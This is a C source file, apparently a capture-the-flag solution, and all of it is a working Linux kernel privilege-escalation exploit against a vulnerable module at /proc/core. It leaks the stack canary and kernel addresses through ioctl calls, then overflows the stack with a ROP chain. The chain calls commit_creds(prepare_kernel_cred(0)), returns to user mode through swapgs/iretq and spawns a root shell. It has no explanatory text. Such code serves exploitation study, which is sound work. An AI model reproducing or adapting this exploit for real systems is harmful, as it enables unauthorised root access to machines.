#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define IOCTL_COPY_CMD 0x6677889a
#define IOCTL_READ_CMD 0x6677889b
#define IOCTL_OFF_CMD 0x6677889c
#define LEAK_OFF 0x19b
#define COMMIT_CREDS_OFF -0x140df1
#define PREPARE_KERNEL_CRED_OFF -0x1409f1
#define POPRDIRET 0xb2f
#define POPRSIRET 0x11d6
#define SWAPGS_POPFQ_RET 0xa012da
#define IRETQRET 0x50ac2

typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);

unsigned long user_cs, user_ss, user_rflags, user_sp;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
	"movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}
void shellcode(commit_creds_func commit_creds,prepare_kernel_cred_func prepare_kernel_cred){
	commit_creds(prepare_kernel_cred(0));
}
void get_shell(){
	puts("[+] root shell!!!!");
	char *argv[]={"/bin/sh",NULL};
	execve("/bin/sh",argv,NULL);
}
int main(){
	save_state();
	char *buf=calloc(0x1000,1);	
	int fd1=open("/proc/core",O_RDWR);
	ioctl(fd1,IOCTL_OFF_CMD,0x40);
	unsigned long leaks[5];
	ioctl(fd1,IOCTL_READ_CMD,leaks);
	unsigned long canary=leaks[0];
	unsigned long kernel_leak=leaks[4];
	unsigned long kernel_module_base=leaks[2]-LEAK_OFF;
	printf("[+] Canary=%p\n",(void *)canary);
	printf("[+] kernel_leak=%p\n",(void *)kernel_leak);
	printf("[+] kernel_module_base=%p\n",(void *)kernel_module_base);
	commit_creds_func commit_creds = (commit_creds_func) kernel_leak+COMMIT_CREDS_OFF;
	prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) kernel_leak+PREPARE_KERNEL_CRED_OFF;
	unsigned long kernel_base=(unsigned long)prepare_kernel_cred-0x9cce0;
	printf("[+] commit_creds=%p\n",(void *)commit_creds);
	printf("[+] prepare_kernel_cred=%p\n",(void *)prepare_kernel_cred);
	printf("[+] kernel base=%p\n",(void *)kernel_base);
	unsigned long poprdiret=kernel_base+POPRDIRET;
	unsigned long poprsiret=kernel_base+POPRSIRET;
	unsigned long swapgs_popfq_ret=kernel_base+SWAPGS_POPFQ_RET;
	unsigned long iretqret = kernel_base+IRETQRET;
	unsigned long rop_chain[]={0,0,0,0,0,0,0,0,canary,0,poprdiret,(unsigned long)commit_creds,poprsiret,(unsigned long)prepare_kernel_cred,
					(unsigned long)shellcode,swapgs_popfq_ret,0,iretqret,(unsigned long)get_shell,
					user_cs,user_rflags,user_sp,user_ss};
	write(fd1,(void *)rop_chain,sizeof(rop_chain));
	ioctl(fd1,IOCTL_COPY_CMD,0xffffffffccdd0100);
}
